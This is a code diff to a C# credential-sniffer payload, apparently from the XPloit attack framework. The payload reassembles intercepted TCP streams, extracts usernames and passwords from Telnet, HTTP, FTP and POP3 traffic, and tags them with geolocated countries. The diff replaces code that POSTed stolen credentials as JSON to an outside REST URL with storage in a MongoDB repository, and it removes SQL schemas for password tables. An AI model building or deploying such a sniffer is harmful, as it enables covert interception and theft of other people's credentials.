@@ -1,15 +1,16 @@
-﻿using PacketDotNet;
+﻿using MongoDB.Driver;
+using PacketDotNet;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Dynamic;
-using System.Net;
 using Xploit.Helpers.Geolocate;
 using Xploit.Sniffer.Enums;
 using Xploit.Sniffer.Extractors;
 using Xploit.Sniffer.Interfaces;
 using XPloit.Core;
 using XPloit.Core.Attributes;
+using XPloit.Core.Mongo;
 using XPloit.Helpers.Attributes;
 using XPloit.Sniffer.Streams;
 
@@ -21,88 +22,32 @@ namespace Payloads.Local.Sniffer
         #region Properties
         public bool CaptureOnTcpStream { get { return true; } }
         public bool CaptureOnPacket { get { return false; } }
-        /*
-CREATE TABLE `pass_ftp` (
-  `DATE` datetime NOT NULL,
-  `HOST` varchar(100) NOT NULL DEFAULT '',
-  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
-  `USER_HASH` char(40) NOT NULL DEFAULT '',
-  `USER` varchar(100) NOT NULL DEFAULT '',
-  `PASS` varchar(255) NOT NULL DEFAULT '',
-  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
-  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
-  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8;
 
-CREATE TABLE `pass_pop3` (
-  `DATE` datetime NOT NULL,
-  `HOST` varchar(100) NOT NULL DEFAULT '',
-  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
-  `USER_HASH` char(40) NOT NULL DEFAULT '',
-  `USER` varchar(100) NOT NULL DEFAULT '',
-  `PASS` varchar(255) NOT NULL DEFAULT '',
-  `AUTH_TYPE` varchar(20) NOT NULL DEFAULT '',
-  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
-  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
-  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`,`AUTH_TYPE`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8;
-
-CREATE TABLE `pass_telnet` (
-  `DATE` datetime NOT NULL,
-  `HOST` varchar(100) NOT NULL DEFAULT '',
-  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
-  `USER_HASH` char(40) NOT NULL DEFAULT '',
-  `USER` varchar(100) NOT NULL DEFAULT '',
-  `PASS` varchar(255) NOT NULL DEFAULT '',
-  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
-  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
-  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8;
-
-CREATE TABLE `pass_httpauth` (
-  `DATE` datetime NOT NULL,
-  `HOST` varchar(100) NOT NULL DEFAULT '',
-  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
-  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
-  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
-  `USER_HASH` char(40) NOT NULL DEFAULT '',
-  `USER` varchar(100) NOT NULL DEFAULT '',
-  `PASS` varchar(255) NOT NULL DEFAULT '',
-  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
-  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
-  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`VALID`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8;
-
-CREATE TABLE `pass_http` (
-  `DATE` datetime NOT NULL,
-  `HOST` varchar(100) NOT NULL DEFAULT '',
-  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
-  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
-  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
-  `USER_HASH` char(40) NOT NULL DEFAULT '',
-  `USER` json NOT NULL,
-  `PASS` json NOT NULL,
-  `TYPE` varchar(10) NOT NULL DEFAULT '',
-  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
-  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
-  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`TYPE`,`VALID`)
-) ENGINE=InnoDB DEFAULT CHARSET=utf8;
-        */
-        [ConfigurableProperty(Description = "Http post url", Optional = true)]
-        public Uri APIRestUrl { get; set; }
+        [ConfigurableProperty(Description = "Mongo repository url", Optional = true)]
+        public XploitMongoRepository<Credential> Repository { get; set; }
 
         [ConfigurableProperty(Description = "Write credentials as info")]
         public bool WriteAsInfo { get; set; }
         #endregion
 
-        Dictionary<string, string> _LastCred = new Dictionary<string, string>();
+        long hay = 0;
+        Dictionary<Credential.ECredentialType, string> _LastCred = new Dictionary<Credential.ECredentialType, string>();
 
-        public bool Check() { return true; }
-        public void OnPacket(object sender, IPProtocolType protocolType, IpPacket packet) { }
+        public void Stop(object sender)
+        {
+            WriteInfo("Stream captured", hay.ToString(), ConsoleColor.Cyan);
+        }
+        public bool Check()
+        {
+            hay = 0;
+            return true;
+        }
+        public void OnPacket(object sender, IPProtocolType protocolType, EthernetPacket packet) { }
 
-        ICredentialExtractor[] _Checks = new ICredentialExtractor[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
+        IObjectExtractor[] _Checks = new IObjectExtractor[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
         public void OnTcpStream(object sender, TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
         {
+            if (isNew) hay++;
             if (stream == null || stream.Count == 0) return;
 
             if (stream.Variables == null)
@@ -119,8 +64,8 @@ CREATE TABLE `pass_http` (
                 {
                     if (!stream.Variables.Valid[x]) continue;
 
-                    Credential[] cred;
-                    switch (_Checks[x].GetCredentials(stream, out cred))
+                    object[] cred;
+                    switch (_Checks[x].GetObjects(stream, out cred))
                     {
                         case EExtractorReturn.DontRetry:
                             {
@@ -159,44 +104,32 @@ CREATE TABLE `pass_http` (
 
         public void Dequeue(object sender, object o)
         {
-            Credential c = (Credential)o;
+            ICountryRecaller ic;
 
-            c.RecallCounty(GeoLite2LocationProvider.Current);
-            string json = c.ToString();
+            if (o is ICountryRecaller)
+            {
+                ic = (ICountryRecaller)o;
+                ic.RecallCounty(GeoLite2LocationProvider.Current);
+            }
+            else return;
 
             // Console
             if (WriteAsInfo)
             {
-                if (c.IsValid) WriteInfo(json);
+                string json = o.ToString();
+
+                if (!(o is Credential) || ((Credential)o).IsValid) WriteInfo(json);
                 else WriteError(json);
             }
 
-            // ApiRest
-            if (APIRestUrl != null)
+            // Repository
+            if (Repository != null && ic != null)
             {
-                //using (HttpClient client = new HttpClient() { })
-                //{
-                //    using (HttpResponseMessage response = await client.PostAsync(APIRestUrl, new StringContent(json, Encoding.UTF8, "application/json")))
-                //    {
-                //        using (HttpContent content = response.Content)
-                //        {
-                //            //string data = await content.ReadAsStringAsync();
-                //        }
-                //    }
-                //}
+                // Split repositories by type
+                IMongoCollection<ICountryRecaller> col =
+                    Repository.Database.GetCollection<ICountryRecaller>(o.GetType().Name);
 
-                //t.RunSynchronously();
-                using (WebClient client = new WebClient())
-                {
-                    client.Headers[HttpRequestHeader.ContentType] = "application/json";
-
-                    string ret = client.UploadString(APIRestUrl, "POST", json);
-                    int r;
-                    if (!int.TryParse(ret, out r))
-                    {
-
-                    }
-                }
+                col.InsertOne(ic);
             }
         }
     }
